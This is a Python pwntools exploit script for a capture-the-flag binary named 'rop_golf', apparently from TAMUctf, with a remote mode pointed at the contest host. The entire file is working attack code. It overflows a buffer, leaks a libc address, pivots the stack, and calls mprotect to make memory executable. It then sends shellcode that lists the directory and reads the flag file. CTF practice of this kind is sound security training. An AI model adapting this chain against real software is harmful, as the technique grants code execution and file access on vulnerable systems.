#!/usr/bin/env python3

from pwn import *

exe = ELF("rop_golf")
rop = ROP(exe)
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="rop-golf")
    elif args.GDB:
        return gdb.debug([exe.path],gdbscript="c\n")
    else:
        return process([exe.path])


CHAIN_ADDR = 0x402000
LIBC_POP_RSP = 0x000000000002420a
LIBC_POP_RAX = 0x3a638
LIBC_POP_RSI = 0x000000000002440e
LIBC_POP_RDX_POP_RSI = 0x0000000000106179
LIBC_POP_R10 = 0x0000000000106154
LIBC_POP_RDI = 0x0000000000023a5f
LIBC_READ = 0xea1c0
LIBC_MPROTECT = 0xf3c30

import time

def send_shellcode(shellcode):
    r = conn()
    # time.sleep(30)

    payload = flat([
        b"A" * 40,
        p64(rop.rdi[0]),
        p64(exe.got['puts']),
        p64(exe.symbols['puts']),
        p64(exe.symbols['vuln']),
    ])
    r.send(payload)
    time.sleep(1)
    r.recvline()
    libc.addr = u64(r.recvline().rstrip().ljust(8,b'\x00')) - 0x71910
    log.info(f"leaked libc address: {hex(libc.addr)}")

    payload = flat([
        b"A" * 32,
        p64(0x404000 - 8),
        p64(libc.addr + LIBC_POP_RAX),
        p64(0x404000),
        p64(exe.symbols['vuln'] + 12),
        p64(exe.symbols['vuln']),
        # b"B"*8
    ])

    r.send(payload)
    time.sleep(1)
    setup_shellcode = flat([
        p64(libc.addr + LIBC_POP_RDI),
        p64(0x404000),
        p64(libc.addr + LIBC_POP_RDX_POP_RSI),
        p64(7),
        p64(0x1000),
        p64(libc.addr + LIBC_MPROTECT),
        p64(libc.addr + LIBC_POP_RDI),
        p64(0),
        p64(libc.addr + LIBC_POP_RDX_POP_RSI),
        p64(len(shellcode)),
        p64(0x404200),
        p64(libc.addr + LIBC_READ),
        p64(0x404200),
    ])

    payload = flat([
        p64(libc.addr + LIBC_POP_RDX_POP_RSI),
        p64(len(setup_shellcode)),
        p64(0x404000 + 0x20),
        p64(libc.addr + LIBC_READ),
        b"B"*40
    ])

    r.send(payload)
    time.sleep(1)
    r.send(setup_shellcode)
    time.sleep(1)
    r.send(shellcode)
    time.sleep(1)

    # good luck pwning :)

    return r.recvall()


def main():
    list_dir = flat([
        asm(shellcraft.amd64.linux.open(".", oflag=constants.O_DIRECTORY)),
        asm(shellcraft.amd64.linux.getdents('rax', 0x404400, 500)),
        asm(shellcraft.write(1, 0x404400, 'rax')),
        asm(shellcraft.exit(0))
    ])
    child_dirs = util.getdents.dirents(send_shellcode(list_dir))
    print(child_dirs)
    flag = next(x for x in child_dirs if x.endswith(".txt"))
    log.info(f"reading file {flag}")
    print(send_shellcode(asm(shellcraft.amd64.linux.cat(flag))))


if __name__ == "__main__":
    main()
